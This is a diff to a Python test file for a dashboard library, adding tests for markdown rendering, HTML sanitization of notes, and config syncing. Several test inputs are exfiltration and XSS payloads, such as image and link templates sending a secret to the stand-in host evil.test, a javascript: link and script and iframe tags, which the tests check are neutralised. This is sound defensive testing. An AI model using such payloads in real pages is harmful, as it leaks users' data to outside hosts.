@@ -2,6 +2,7 @@
 
 import html
 import re
+import typing as t
 
 import pandas as pd
 import panel as pn
@@ -23,10 +24,11 @@ from panel_flowdash.text_components import (
     Heading,
     Markdown,
     Notes,
-    escape_inline_markdown,
     fill_template,
     format_value,
     html_to_text,
+    render_markdown,
+    sanitize_notes,
 )
 from panel_flowdash.ui.roles import component_role
 from panel_flowdash.widgets import BUILTIN_COMPONENTS
@@ -97,11 +99,46 @@ class TestTemplate:
         frame = pd.DataFrame({"a": range(1200), "b": range(1200)})
         assert format_value(frame) == "1,200 rows, 2 columns"
 
-    def test_values_are_escaped(self):
-        assert fill_template("*{{ value }}*", "a*b", escape_inline_markdown) == r"*a\*b*"
+    def test_huge_format_widths_are_ignored(self):
+        assert format_value(3, ">99999999") == "3"
+        assert format_value(3, ">5") == "    3"
 
-    def test_escape_keeps_a_value_on_one_line(self):
-        assert escape_inline_markdown("# a\n\n- b") == r"\# a \- b"
+
+class TestRenderMarkdown:
+    VALUE: t.ClassVar[dict] = {"secret": "hunter2", "code": "a.b-c *x* <b>"}
+
+    @pytest.mark.parametrize(
+        ("template", "expected"),
+        [
+            ("**{{ value.code }}**", "<p><strong>a.b-c *x* &lt;b&gt;</strong></p>"),
+            ("`{{ value.code }}`", "<p><code>a.b-c *x* &lt;b&gt;</code></p>"),
+            ("```\n{{ value.code }}\n```", "<pre><code>a.b-c *x* &lt;b&gt;\n</code></pre>"),
+            (
+                "| a |\n|---|\n| {{ value.code }} |",
+                "<td>a.b-c *x* &lt;b&gt;</td>",
+            ),
+            ("# {{ value.secret }}", "<h1>hunter2</h1>"),
+        ],
+    )
+    def test_values_are_literal_text_in_every_context(self, template, expected):
+        assert expected in render_markdown(template, self.VALUE)
+
+    @pytest.mark.parametrize(
+        "template",
+        [
+            "![i](https://evil.test/p.png?d={{ value.secret }})",
+            "[link](https://evil.test/{{ value.secret }})",
+            "<https://evil.test/{{ value.secret }}>",
+            "[r]\n\n[r]: https://evil.test/{{ value.secret }}",
+        ],
+    )
+    def test_values_never_reach_a_url(self, template):
+        rendered = render_markdown(template, self.VALUE)
+        assert "hunter2" not in "".join(re.findall(r"<[^>]+>", rendered))
+
+    def test_values_fill_image_alt_text(self):
+        rendered = render_markdown("![{{ value.secret }}](https://example.com/a.png)", self.VALUE)
+        assert 'alt="hunter2"' in rendered
 
 
 class TestMarkdown:
@@ -112,13 +149,16 @@ class TestMarkdown:
             config={"text": "**{{ value.state }}** has {{ value.turbines }} turbines"},
         )
         pane = editor._tile_objects[-1]
-        assert _text(_html(pane)).strip() == "**** has  turbines"
+        assert _text(_html(pane)).strip() == "has  turbines"
 
         assert editor.connect(source, "out", node, "value") is True
         assert "<strong>Texas</strong> has 19,046 turbines" in _html(pane)
 
         editor.graph.get_config_state(node).text = "# {{ value.state }}"
         assert "<h1>Texas</h1>" in _html(pane)
+
+    def test_text_starts_at_the_top_of_the_tile(self):
+        assert ":host > div > :first-child" in Markdown()._pane.stylesheets[0]
 
     def test_input_is_optional_and_does_not_gate_the_view(self, editor):
         node = editor.add_component("Text/Markdown")
@@ -134,9 +174,7 @@ class TestMarkdown:
         assert '<img src=x onerror="alert(1)">' in _text(rendered)
 
     def test_math_is_not_typeset(self):
-        pane = Markdown()._pane
-        assert pane.disable_math is True
-        assert "disable_math" in pane._rename.values()
+        assert Markdown()._pane.disable_math is True
 
     @pytest.mark.parametrize("name", sorted(PAYLOADS))
     def test_upstream_values_are_shown_as_text(self, name):
@@ -145,7 +183,7 @@ class TestMarkdown:
         rendered = _html(markdown._pane)
         assert "evil.test" not in "".join(re.findall(r"<[^>]+>", rendered))
         assert "<img" not in rendered
-        assert " ".join(payload.split()) in _text(rendered)
+        assert " ".join(payload.split()) in " ".join(_text(rendered).split())
 
     def test_preview_is_the_filled_text(self):
         markdown = Markdown(text="# {{ value }}\n\nSome **bold** <b>x</b>", value="Texas")
@@ -219,12 +257,63 @@ class TestNotes:
         notes._editor.value = "<p>y</p>"
         assert notes.text == "<p>y</p>"
 
-    def test_removing_releases_the_editor_subscription(self, editor):
+    def test_removing_releases_its_subscriptions(self, editor):
         node = editor.add_component("Text/Notes")
+        notes = editor._component_instances[node]
         before = len(editor._subscriptions())
-        assert before
         editor.remove_component(node)
-        assert len(editor._subscriptions()) < before
+        assert len(editor._subscriptions()) == before - 1
+        editor.dirty = False
+        notes._editor.value = "<p>After removal</p>"
+        assert not editor.dirty
+
+    def test_does_not_keep_the_editor_alive(self):
+        import gc
+        import weakref
+
+        editor = FlowDash({}, notifications=False)
+        notes = editor._component_instances[editor.add_component("Text/Notes")]
+        ref = weakref.ref(editor)
+        editor.dispose()
+        del editor
+        gc.collect()
+        assert ref() is None
+        assert not notes.editing
+
+    def test_stored_markup_outside_the_toolbar_is_dropped(self, editor):
+        stored = (
+            '<p style="color:red">Hi <img src="https://evil.test/t.png">'
+            '<a href="javascript:alert(1)">x</a></p>'
+            '<iframe class="ql-video" src="https://evil.test/frame"></iframe>'
+        )
+        node = editor.add_component("Text/Notes", config={"text": stored})
+        notes = editor._component_instances[node]
+        assert notes._editor.value == "<p>Hi <a>x</a></p>"
+
+        notes._editor.value = '<p>Pasted <img src="data:image/png;base64,AAAA"></p>'
+        assert editor.graph.get_config_state(node).text == "<p>Pasted </p>"
+        assert notes._editor.value == '<p>Pasted <img src="data:image/png;base64,AAAA"></p>'
+
+    @pytest.mark.parametrize(
+        ("markup", "clean"),
+        [
+            ("<h2>T</h2><p>a <strong>b</strong></p>", "<h2>T</h2><p>a <strong>b</strong></p>"),
+            (
+                '<ol><li data-list="bullet" class="ql-indent-1 x">'
+                '<span class="ql-ui" contenteditable="false"></span>One</li></ol>',
+                '<ol><li data-list="bullet" class="ql-indent-1">One</li></ol>',
+            ),
+            (
+                '<p><a href="https://example.com" onclick="x()">l</a></p>',
+                '<p><a href="https://example.com" rel="noopener noreferrer" '
+                'target="_blank">l</a></p>',
+            ),
+            ("<script>alert(1)</script><p>&lt;b&gt;</p>", "<p>&lt;b&gt;</p>"),
+            ("<p>unclosed <em>em", "<p>unclosed <em>em</em></p>"),
+        ],
+    )
+    def test_sanitize(self, markup, clean):
+        assert sanitize_notes(markup) == clean
 
     def test_preview_is_plain_text(self):
         notes = Notes(text="<h2>Title</h2><p>Some <strong>bold</strong></p><ul><li>One</li></ul>")
@@ -236,14 +325,47 @@ class TestNotes:
             ("", ""),
             ("<p>a</p><p>b</p>", "a\nb"),
             ("<p>a<br>b</p>", "a\nb"),
-            ("<script>x</script><p>&lt;b&gt;</p>", "x\n<b>"),
+            ("<script>x</script><style>p {}</style><p>&lt;b&gt;</p>", "<b>"),
         ],
     )
     def test_html_to_text(self, markup, text):
         assert html_to_text(markup) == text
 
 
+class Counter(Viewer):
+    count = param.Integer(default=0, metadata={"flowdash": {"two_way": True}})
+
+    def __panel__(self):
+        return pn.pane.Str(self.param.count)
+
+
+register(page=False, component=True, title="Counter", config=["count"])(Counter)
+
+
 class TestTwoWayConfig:
+    def test_a_component_edit_is_saved(self):
+        editor = FlowDash({"Demo/counter": Counter}, notifications=False)
+        node = editor.add_component("Demo/counter")
+        editor.dirty = False
+        editor._component_instances[node].count = 3
+        assert editor.graph.get_config_state(node).count == 3
+        assert editor._tile_items[0]["config"]["count"] == 3
+        assert editor.dirty
+        editor.dispose()
+
+    @pytest.mark.parametrize("mode", ["view", "read_only"])
+    def test_a_component_edit_is_undone_unless_editable(self, mode):
+        editor = FlowDash({"Demo/counter": Counter}, notifications=False)
+        node = editor.add_component("Demo/counter", config={"count": 1})
+        editor.dirty = False
+        setattr(editor, "editable" if mode == "view" else "read_only", mode == "read_only")
+        counter = editor._component_instances[node]
+        counter.count = 5
+        assert counter.count == 1
+        assert editor.graph.get_config_state(node).count == 1
+        assert not editor.dirty
+        editor.dispose()
+
     def test_only_declared_params_are_synced_back(self, editor):
         node = editor.add_component("Text/Markdown", config={"text": "a"})
         editor.dirty = False
